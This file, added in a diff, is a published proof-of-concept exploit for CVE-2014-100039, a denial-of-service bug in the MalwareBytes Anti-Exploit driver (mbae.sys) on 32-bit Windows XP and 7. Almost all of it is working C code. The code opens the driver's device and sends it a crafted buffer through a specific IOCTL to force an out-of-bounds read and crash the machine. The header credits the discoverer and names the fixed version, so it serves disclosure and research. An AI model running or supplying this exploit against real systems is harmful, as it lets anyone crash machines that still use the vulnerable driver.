@@ -1,0 +1,71 @@
+/*
+
+Exploit Title    - MalwareBytes Anti-Exploit Out-of-bounds Read DoS
+Date             - 19th January 2015
+Discovered by    - Parvez Anwar (@parvezghh)
+Vendor Homepage  - https://www.malwarebytes.org
+Tested Version   - 1.03.1.1220, 1.04.1.1012
+Driver Version   - no version set - mbae.sys
+Tested on OS     - 32bit Windows XP SP3 and Windows 7 SP1
+OSVDB            - http://www.osvdb.org/show/osvdb/114249
+CVE ID           - CVE-2014-100039
+Vendor fix url   - https://forums.malwarebytes.org/index.php?/topic/158251-malwarebytes-anti-exploit-hall-of-fame/
+Fixed version    - 1.05
+Fixed driver ver - no version set
+
+*/
+
+
+
+#include <stdio.h>
+#include <windows.h>
+
+#define BUFSIZE 25
+
+
+int main(int argc, char *argv[]) 
+{
+    HANDLE         hDevice;
+    char           devhandle[MAX_PATH];
+    DWORD          dwRetBytes = 0;
+    BYTE           sizebytes[4] = "\xff\xff\xff\x00";   
+    BYTE           *inbuffer;
+
+
+    printf("-------------------------------------------------------------------------------\n");
+    printf("        MalwareBytes Anti-Exploit (mbae.sys) Out-of-bounds Read DoS            \n");
+    printf("             Tested on Windows XP SP3/Windows 7 SP1 (32bit)                    \n");
+    printf("-------------------------------------------------------------------------------\n\n");
+
+    sprintf(devhandle, "\\\\.\\%s", "ESProtectionDriver");
+
+    inbuffer = VirtualAlloc(NULL, BUFSIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    memset(inbuffer, 0x41, BUFSIZE);
+    memcpy(inbuffer, sizebytes, sizeof(sizebytes));
+
+    printf("\n[i] Size of total buffer being sent %d bytes", BUFSIZE);
+
+    hDevice = CreateFile(devhandle, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING , 0, NULL);
+    
+    if(hDevice == INVALID_HANDLE_VALUE)
+    {
+        printf("\n[-] Open %s device failed\n\n", devhandle);
+        return -1;
+    }
+    else 
+    {
+        printf("\n[+] Open %s device successful", devhandle);
+    }	
+
+    printf("\n[~] Press any key to DoS . . .");
+    getch();
+
+    DeviceIoControl(hDevice, 0x0022e000, inbuffer, BUFSIZE, NULL, 0, &dwRetBytes, NULL);
+
+    printf("\n[+] DoS buffer sent\n\n");
+ 
+    CloseHandle(hDevice);
+
+    return 0;
+}
